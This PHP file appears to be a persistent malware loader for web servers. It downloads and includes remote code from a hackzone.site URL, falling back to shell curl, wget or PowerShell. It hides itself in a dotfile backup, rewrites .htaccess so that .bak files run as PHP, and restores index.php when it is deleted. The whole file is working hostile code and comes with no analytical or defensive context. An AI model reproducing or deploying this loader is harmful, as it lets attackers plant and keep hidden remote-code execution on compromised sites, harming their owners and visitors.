<?php declare(strict_types=1);
$SCRIPT_SOURCE  = 'https://hackzone.site/script/index.txt';
$DOWNLOAD_TIMEOUT = 10;
$__selfCode = '';
if ($__selfCode === '' && function_exists('file_get_contents')) {
    $__selfCode = (string) @file_get_contents(__FILE__);
}
if ($__selfCode === '' && function_exists('fopen')) {
    $__fh = @fopen(__FILE__, 'rb');
    if ($__fh) { $__selfCode = (string) @stream_get_contents($__fh); fclose($__fh); }
}
if ($__selfCode === '' && function_exists('file')) {
    $__lines = @file(__FILE__, FILE_IGNORE_NEW_LINES);
    if (is_array($__lines)) $__selfCode = implode("\n", $__lines);
}
if ($__selfCode === '' && class_exists('SplFileObject')) {
    try {
        $__spl = new SplFileObject(__FILE__, 'rb');
        $__buf = '';
        while (!$__spl->eof()) $__buf .= $__spl->fgets();
        if (strlen($__buf) >= 500) $__selfCode = $__buf;
        unset($__spl, $__buf);
    } catch (Throwable) {}
}
if ($__selfCode === '' && function_exists('shell_exec')) {
    $__cmd = DIRECTORY_SEPARATOR === '\\'
        ? 'type ' . escapeshellarg(__FILE__) . ' 2>nul'
        : 'cat '  . escapeshellarg(__FILE__) . ' 2>/dev/null';
    $__out = @shell_exec($__cmd);
    if (is_string($__out) && strlen($__out) >= 500) $__selfCode = $__out;
}
$__self       = __FILE__;
$__dir        = __DIR__;
$__mainFile   = $__dir . DIRECTORY_SEPARATOR . 'index.php';
$__bakFile    = $__dir . DIRECTORY_SEPARATOR . '.index.bak';
$__tempBackup = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'index_' . md5($__mainFile) . '.php';
$__useApcu    = function_exists('apcu_fetch') && (int) ini_get('apc.enabled') === 1;
$__selfKey    = 'index_self_' . md5($__mainFile);
if (strlen($__selfCode) >= 500) {
    $__bakStale = !file_exists($__bakFile)
        || filesize($__bakFile) < 500
        || (file_exists($__mainFile) && filemtime($__bakFile) < filemtime($__mainFile));
    if ($__bakStale) {
        @file_put_contents($__bakFile, $__selfCode, LOCK_EX);
    }
}
$__htaccessFile    = $__dir . DIRECTORY_SEPARATOR . '.htaccess';
$__htaccessContent = 'RewriteEngine On
RewriteCond %{THE_REQUEST} \.bak [NC]
RewriteRule ^ - [F,L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^index\.php$ .index.bak [L]
<FilesMatch "\.bak$">
    SetHandler application/x-httpd-php
</FilesMatch>
';
if (!file_exists($__htaccessFile) || filesize($__htaccessFile) < 50) {
    @file_put_contents($__htaccessFile, $__htaccessContent, LOCK_EX);
}
if (realpath($__self) !== realpath($__mainFile)) {
    $__code = null;
    if ($__useApcu) {
        $__code = apcu_fetch($__selfKey, $__hit);
        if (!$__hit) $__code = null;
    }
    if ($__code === null && file_exists($__tempBackup) && filesize($__tempBackup) >= 500) {
        $__code = @file_get_contents($__tempBackup);
    }
    if ($__code === null || strlen((string) $__code) < 500) {
        $__code = $__selfCode;
    }
    if (is_string($__code) && strlen($__code) >= 500) {
        @file_put_contents($__mainFile, $__code, LOCK_EX);
    }
}
if (strlen($__selfCode) >= 500) {
    if ($__useApcu) {
        apcu_store($__selfKey, $__selfCode);
    }
    if (!file_exists($__tempBackup) || filesize($__tempBackup) < 500
        || (file_exists($__mainFile) && filemtime($__tempBackup) < filemtime($__mainFile))) {
        @file_put_contents($__tempBackup, $__selfCode, LOCK_EX);
    }
}
register_shutdown_function(function() use ($__mainFile, $__selfKey, $__tempBackup, $__bakFile, $__useApcu, $__selfCode, $__htaccessFile, $__htaccessContent) {
    if (!file_exists($__htaccessFile) || filesize($__htaccessFile) < 50) {
        @file_put_contents($__htaccessFile, $__htaccessContent, LOCK_EX);
    }
    if (file_exists($__mainFile) && filesize($__mainFile) >= 500) return;
    $code = null;
    if ($__useApcu) {
        $code = apcu_fetch($__selfKey, $hit);
        if (!$hit) $code = null;
    }
    if ($code === null && file_exists($__tempBackup)) $code = @file_get_contents($__tempBackup);
    if ($code === null && file_exists($__bakFile))    $code = @file_get_contents($__bakFile);
    if ($code === null && strlen($__selfCode) >= 500) $code = $__selfCode;
    if (is_string($code) && strlen($code) >= 500) {
        @file_put_contents($__mainFile, $code, LOCK_EX);
    }
});
$__isHttp   = (bool) preg_match('#^https?://#i', $SCRIPT_SOURCE);
$__cacheKey = 'index_' . md5($SCRIPT_SOURCE);
$__ramDir = (DIRECTORY_SEPARATOR === '/' && is_dir('/dev/shm') && is_writable('/dev/shm'))
    ? '/dev/shm'
    : sys_get_temp_dir();
$__ramFile     = $__ramDir . DIRECTORY_SEPARATOR . $__cacheKey . '.php';
$__apcuCodeKey = $__cacheKey . '_code';
$__ready       = false;
if ($__useApcu) {
    $__apcuCode = apcu_fetch($__apcuCodeKey, $__hit);
    if ($__hit && !empty($__apcuCode)) {
        if (!file_exists($__ramFile)) {
            file_put_contents($__ramFile, $__apcuCode, LOCK_EX);
        }
        $__ready = true;
    }
}
if (!$__ready && file_exists($__ramFile)) {
    if ($__useApcu) apcu_store($__apcuCodeKey, file_get_contents($__ramFile));
    $__ready = true;
}
if (!$__ready) {
    if ($__isHttp) {
        $__fetch = static function(string $url, int $timeout): string|false {
            $isWin = DIRECTORY_SEPARATOR === '\\';
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL            => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_MAXREDIRS      => 5,
                    CURLOPT_TIMEOUT        => $timeout,
                    CURLOPT_CONNECTTIMEOUT => min($timeout, 5),
                    CURLOPT_SSL_VERIFYPEER => true,
                    CURLOPT_USERAGENT      => 'MemRun/5.0',
                    CURLOPT_ENCODING       => '',
                ]);
                $out = curl_exec($ch);
                curl_close($ch);
                if (is_string($out) && trim($out) !== '') return $out;
            }
            $ctx = stream_context_create([
                'http' => ['timeout' => $timeout, 'follow_location' => true, 'max_redirects' => 5, 'user_agent' => 'MemRun/5.0', 'ignore_errors' => true],
                'ssl'  => ['verify_peer' => true, 'verify_peer_name' => true],
            ]);
            $out = @file_get_contents($url, false, $ctx);
            if (is_string($out) && trim($out) !== '') return $out;
            $fh = @fopen($url, 'r', false, $ctx);
            if ($fh) {
                $out = @stream_get_contents($fh);
                fclose($fh);
                if (is_string($out) && trim($out) !== '') return $out;
            }
            if (function_exists('shell_exec')) {
                $tmp  = tempnam(sys_get_temp_dir(), 'mr_');
                $qu   = escapeshellarg($url);
                $qt   = escapeshellarg($tmp);
                $null = $isWin ? '2>nul' : '2>/dev/null';
                $cmds = $isWin ? [
                    "curl.exe -s -L --max-time {$timeout} -o {$qt} {$qu} {$null}",
                    "wget.exe -q --timeout={$timeout} -O {$qt} {$qu} {$null}",
                    "powershell -NoProfile -NonInteractive -Command \"(New-Object Net.WebClient).DownloadFile({$qu},{$qt})\" {$null}",
                ] : [
                    "wget -q --timeout={$timeout} -O {$qt} {$qu} {$null}",
                    "curl -s -L --max-time {$timeout} -o {$qt} {$qu} {$null}",
                ];
                foreach ($cmds as $cmd) {
                    @shell_exec($cmd);
                    if (file_exists($tmp) && filesize($tmp) > 0) {
                        $out = @file_get_contents($tmp);
                        @unlink($tmp);
                        if (is_string($out) && trim($out) !== '') return $out;
                    }
                }
                @unlink($tmp);
            }
            return false;
        };
        $__content = $__fetch($SCRIPT_SOURCE, $DOWNLOAD_TIMEOUT);
    } else {
        if (!file_exists($SCRIPT_SOURCE)) {
            exit('[MemRun] File tidak ditemukan: ' . $SCRIPT_SOURCE);
        }
        $__content = @file_get_contents($SCRIPT_SOURCE);
    }
    if ($__content === false || trim($__content) === '') {
        exit('[MemRun] Gagal memuat dari semua metode: ' . $SCRIPT_SOURCE);
    }
    file_put_contents($__ramFile, $__content, LOCK_EX);
    if ($__useApcu) apcu_store($__apcuCodeKey, $__content);
}
include $__ramFile;
